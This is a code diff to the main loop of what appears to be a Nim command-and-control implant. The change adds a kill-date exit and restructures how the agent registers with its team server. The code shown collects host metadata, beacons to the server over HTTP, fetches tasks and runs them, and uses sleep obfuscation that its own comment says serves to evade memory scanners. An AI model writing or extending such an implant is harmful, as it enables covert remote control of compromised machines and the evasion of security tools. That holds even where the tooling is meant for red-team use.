@@ -1,6 +1,6 @@
 import strformat, os, times, system, base64, random
 
-import core/[http, context, sleepmask]
+import core/[http, context, sleepmask, exit]
 import utils/io
 import protocol/[task, result, heartbeat, registration]
 import ../common/[types, utils, crypto]
@@ -13,43 +13,43 @@ proc main() =
     if ctx == nil: 
         quit(0)
 
-    # Create registration payload
-    var registration: AgentRegistrationData = ctx.collectAgentMetadata()
-    let registrationBytes = ctx.serializeRegistrationData(registration)
-
-    if ctx.httpPost(registrationBytes): 
-        print fmt"[+] [{ctx.agentId}] Agent registered."
-        ctx.registered = true
-    else: 
-        print "[-] Agent registration failed."
-
     #[
         Agent routine: 
-        1. Sleep Obfuscation
-        2. Register to the team server if not already register
-        3. Retrieve tasks via checkin request to a GET endpoint
-        4. Execute task and post result
-        5. If additional tasks have been fetched, go to 3.
-        6. If no more tasks need to be executed, go to 1. 
+        1. Check kill date
+        2. Sleep Obfuscation
+        3. Register to the team server if not already connected
+        4. Retrieve tasks via checkin request to a GET endpoint
+        5. Execute task and post result
+        6. If additional tasks have been fetched, go to 3.
+        7. If no more tasks need to be executed, go to 1. 
     ]#
     while true: 
-
-        # Sleep obfuscation to evade memory scanners
-        sleepObfuscate(ctx.sleepSettings)
-        
-        # Register
-        if not ctx.registered: 
-            if ctx.httpPost(registrationBytes): 
-                print fmt"[+] [{ctx.agentId}] Agent registered."
-                ctx.registered = true
-            else: 
-                print "[-] Agent registration failed."
-                continue
-
-        let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
-        print "\n", fmt"[*] [{date}] Checking in."
-
         try: 
+            # Check kill date and exit the agent process if it is already passed
+            if ctx.killDate != 0 and now().toTime().toUnix().int64 >= ctx.killDate: 
+                print "[*] Reached kill date: ", ctx.killDate.fromUnix().utc().format("dd-MM-yyyy HH:mm:ss"), " (UTC)."
+                print "[*] Exiting."
+                exit()
+
+            # Sleep obfuscation to evade memory scanners
+            sleepObfuscate(ctx.sleepSettings)
+            
+            # Register
+            if not ctx.registered: 
+                # Create registration payload   
+                var registration: AgentRegistrationData = ctx.collectAgentMetadata()
+                let registrationBytes = ctx.serializeRegistrationData(registration)
+
+                if ctx.httpPost(registrationBytes): 
+                    print fmt"[+] [{ctx.agentId}] Agent registered."
+                    ctx.registered = true
+                else: 
+                    print "[-] Agent registration failed."
+                    continue
+
+            let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
+            print "\n", fmt"[*] [{date}] Checking in."
+
             # Retrieve task queue for the current agent by sending a check-in/heartbeat request
             # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
             var heartbeat: Heartbeat = ctx.createHeartbeat()
